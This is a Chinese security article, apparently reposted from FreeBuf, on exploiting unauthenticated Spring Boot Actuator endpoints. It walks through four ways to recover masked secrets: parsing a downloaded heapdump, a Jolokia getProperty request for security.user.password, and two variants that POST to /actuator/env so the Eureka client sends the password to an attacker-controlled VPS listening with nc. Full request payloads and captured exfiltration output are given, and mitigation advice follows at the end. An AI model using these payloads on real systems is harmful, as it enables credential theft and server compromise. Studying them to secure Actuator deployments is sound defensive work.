#  Spring Boot Actuator信息泄露漏洞三种利用方式总结   
网安探索员  网安探索员   2024-08-10 20:00  
  
## 原文链接：https://www.freebuf.com/vuls/407651.html  
## 1.介绍  
  
Spring Boot是一个基于Spring的套件，它提供了一个即开即用的应用程序架构，可以简化Spring应用的创建及部署流程，帮助开发者更轻松快捷地构建出企业及应用。  
  
Spring Boot项目中Actuator模块提供了众多HTTP接口端点（Endpoint），来提供应用程序运行时的内部状态信息。可以使用http、jmx、ssh、telnet等来管理和监控应用。包括应用的审计（Auditing）、健康（health）状态信息、数据采集（metrics gathering）统计等监控运维的功能。如果没有正确使用Actuator，可能造成信息泄露等严重的安全隐患（外部人员非授权访问Actuator端点）。其中heapdump作为Actuator组件最为危险的Web端点，heapdump因未授权访问被恶意人员获取后进行分析，可进一步获取敏感信息。  
  
Spring Boot 1.x 和 2.x 的 Actuator模块设置有差别，访问功能的路径也有差别，但现在多使用的Spring Boot版本为2.x  
## 2.Actuator存在两个版本  
### 1）x版本  
  
/configprops#显示所有@ConfigurationProperties  
  
/env#公开Spring的ConfigurableEnvironment  
  
/health#显示应用程序运行状况信息  
  
/httptrace#显示HTTP跟踪信息  
  
/metrics#显示当前应用程序的监控指标信息  
  
/mappings#显示所有@RequestMapping路径的整理列表  
  
/threaddump#线程转储  
  
/heapdump#堆转储  
  
/jolokia#JMX-HTTP桥,它提供了一种访问JMXbeans的替代方法  
### 2）x版本  
  
/actuator/configprops # 显示所有@ConfigurationProperties  
  
/actuator/env # 公开Spring的ConfigurableEnvironment  
  
/actuator/health # 显示应用程序运行状况信息  
  
/actuator/httptrace # 显示HTTP跟踪信息  
  
/actuator/metrics # 显示当前应用程序的监控指标信息。  
  
/actuator/mappings # 显示所有@RequestMapping路径的整理列表  
  
/actuator/threaddump # 线程转储  
  
/actuator/heapdump#堆转储  
  
/actuator/jolokia#JMX-HTTP桥,它提供了一种访问JMXbeans的替代方法  
### 3）/actuator/env利用  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CSyEGWNz8kvJV2UIibQChZGD7kz6sG8VWOcjwloP56k7upqY5EqwNE5vY11cPvKENHBYLyKep7txcXqAbVbGVKg/640?wx_fmt=jpeg&from=appmsg "")  
  
该端点可以返回全部环境变量以及一些配置信息，其中就包含了数据库配置信息。但是我们可以看到password被用*代替了，这时就要想办法读取该数据了，获取明文密码办法有以下四种。  
### 方法一（heapdump）  
  
利用条件:  
  
可正常GET请求目标/heapdump或/actuator/heapdump接口  
  
利用方法:  
  
（1）下载heapdump  
  
127.0.0.1:8088/actuator/heapdump 下载heapdump文件，泄露JAVA堆dump信息：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CSyEGWNz8kvJV2UIibQChZGD7kz6sG8VWma8f5rZIVaa9nz6VzibjONicfncxZY66aCXx32bd3KYUVy85yib0Tb3QA/640?wx_fmt=jpeg&from=appmsg "")  
  
（2）heapdump文件解密  
  
https://github.com/wyzxxz/heapdump_tool  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CSyEGWNz8kvJV2UIibQChZGD7kz6sG8VWIFI8knVuWibsQfSbDaaA5UtrGScGdV7Vp7z6TrxCGqQz7ibuc5lB8pdg/640?wx_fmt=jpeg&from=appmsg "")  
  
查询密码 > password  
  
获取ip > getip  
  
获取url > geturl  
  
获取文件路径 > getfile  
### 方法二（jolokia）  
  
利用条件:  
  
目标网站存在/jolokia或/actuator/jolokia接口  
  
目标使用了jolokia-core依赖（版本要求暂未知）  
  
默认情况下actuator是没有jolokia接口的，所以需要再添加如下依赖  
```
<dependency>
    <groupId>org.jolokia</groupId> 
    <artifactId>jolokia-core</artifactId> 
<version>1.7.0</version>
```  
  
利用方法:  
1. 首先访问/actuator/env接口，获取想要获得明文的属性名，然后通过jolokia调用相关Mbean获取明文。  
  
1. 然后访问http://ip:port/actuator/jolokia/list看一下目标环境中存在的MBean：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CSyEGWNz8kvJV2UIibQChZGD7kz6sG8VWepAVgoDkyZbib1fBNVD1TUicvpxTxmZtzyb39nRcELbsyyAaJqn2iaickA/640?wx_fmt=jpeg&from=appmsg "")  
  
接下来就可以通过调用我们找到的MBean来获取我们感兴趣字段的明文了。  
  
如果是1.x版本请求路径则为/jolokia  
  
当前环境测试如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CSyEGWNz8kvJV2UIibQChZGD7kz6sG8VWeRfPDjkMP512H1vwyOiaF0PzGkxBDMdjfrCaYPzJNyzQjfY4LrVOlEQ/640?wx_fmt=jpeg&from=appmsg "")  
```
POST/actuator/jolokia 
Content-Type:application/json 
{"mbean":"org.springframework.boot:name=SpringApplication,type=Admin","operation":"getProperty","type":"EXEC","arguments":["security.user.password"]}
```  
### 方法三（VPS）  
  
利用条件  
  
可以GET请求目标网站的/env  
  
可以POST请求目标网站的/env  
  
可以POST请求目标网站的/refresh接口刷新配置（存在spring-boot-starter-actuator依赖）  
  
目标使用了spring-cloud-starter-netflix-eureka-client依赖  
  
目标可以请求攻击者的服务器（请求可出外网）  
  
这里需要注意的是，添加了spring-cloud-starter-netflix-eureka-client依赖后，启动项目可能会报一个如下错误：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CSyEGWNz8kvJV2UIibQChZGD7kz6sG8VW5gjQWmx0OzgD2oh0IV6eJKw0hDb7tw7ZicuC0CV37rGWKicDUdw25mNA/640?wx_fmt=jpeg&from=appmsg "")  
  
移除了当前项目中的servlet依赖后报错消失。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/CSyEGWNz8kvJV2UIibQChZGD7kz6sG8VWW1ja6Pwvf4NibMHzoPStEIonInR7G3VotSGsA595uQSqxibE4stKhJgg/640?wx_fmt=jpeg&from=appmsg "")  
  
还有一个问题就是如果使用的Spring Boot版本大于2.2.4，则必须使用下面的属性手动启用POST API调用  
  
management.endpoint.env.post.enabled=true  
  
否则不能通过POST访问env端点。  
  
利用方法  
1. 首先访问http://127.0.0.1:8080/actuator/env来获取我们想要明文字段的key  
  
2. 在自己控制的外网服务器上监听80端口nc-lvk80  
  
3. 将下面http://value:${security.user.password}@your-vps-ipsecurity.user.password换成自己想要获取的对应的星号*遮掩的属性名；your-vps-ip换成自己外网服务器的真实ip地址  
```
POST/actuator/env 
Content-Type:application/json 
{"name":"eureka.client.serviceUrl.defaultZone","value":"http://value:${security.user.password}@your-vps-ip"}
```  
  
4. 刷新配置  
```
POST/actuator/refresh 
Content-Type:application/json
```  
  
5. 解码属性值接下来VPS会获得如下请求  
```
GET/apps/HTTP/1.1 
Accept:application/json,application/*+json 
Authorization:BasicdmFsdWU6cm9vdA==
```  
  
Host:******  
```
Connection:Keep-Alive 
User-Agent:Apache-HttpClient/4.5.13(Java/1.8.0_191)
Accept-Encoding:gzip,deflate
```  
  
将Authorization字段进行base64解密后,得到的值就是value:password  
### 方法四（VPS）  
  
利用条件  
  
通过POST/env设置属性触发目标对外网指定地址发起任意http请求  
  
目标可以请求攻击者的服务器（请求可出外网）  
  
利用方法  
  
在目标发外部http请求的过程中，在urlpath中利用占位符带出数据。  
1. 首先访问http://127.0.0.1:8080/actuator/env来获取我们想要明文字段的key  
  
2. 在自己控制的外网服务器上监听80端口：nc-lvk80  
  
3. 构造如下数据包  
```
POST/actuator/env
Content-Type:application/json

{"name":"eureka.client.serviceUrl.defaultZone","value":"http://your-vps-ip/${security.user.password}"}
```  
  
4. 刷新配置  
```
POST/actuator/refresh 
Content-Type:application/json
```  
  
5. 查看VPS  
  
接下来VPS就会收到请求：  
```
Ncat:Connectionfrom****** 
GET/SecretKe/apps/HTTP/1.1 
Accept:application/json,application/*+json 
Host:****** 
Connection:Keep-Alive
User-Agent:Apache-HttpClient/4.5.13(Java/1.8.0_191)
Accept-Encoding:gzip,deflate
```  
  
apps前面的路径就是我们需要的数据。  
## 4.结语  
  
Spring Boot使开发更加简单和高效，因此也得到了广泛的应用，这也导致了漏洞影响面的扩大，Spring Boot漏洞可造成以下危害：  
  
1、未授权的访问者可以通过Actuator端点  
获取敏感信息，如数据库账户密码，代码及后台账号密码，攻击者可利用泄露信息进行进一步利用，并进行更深入的攻击。.  
  
2、攻击者可以通过Actuator端点的未授权访问，  
执行恶意操作，如修改配置、篡改数据、重启应用程序、关闭数据库连接等，从而破坏应用程序的正常运行。  
  
3、当系统使用Jolokia库特性可以  
远程执行任意代码，获取服务器权限。  
  
网宿建议可能受影响的企业采取以下措施来缓解Spring Boot系列漏洞的影响：  
  
1、引入 security 依赖：开启security功能，打开安全限制并进行身份验证；同时设置单独的 Actuator 管理端口并配置不对外网开放。  
  
2、禁用敏感端点：根据实际需求，禁用或限制不需要的Actuator端点，避免将过多敏感信息暴露给未授权访问者  
  
3、加强日志和监控：定期监控和审计Actuator端点的访问日志，及时发现异常访问，并采取适当的响应措施。  
  
4、加强边界防护：引入WAF等边界防护手段，拦截针对Spring Boot漏洞的利用行为。  
  
网宿全站防护-WAF模块已第一时间支持Spring Boot系列漏洞的防护，并持续挖掘分析其他变种攻击方式和各类组件漏洞，第一时间上线防护规则，缩短防护“空窗期”。  
  
  
  
  
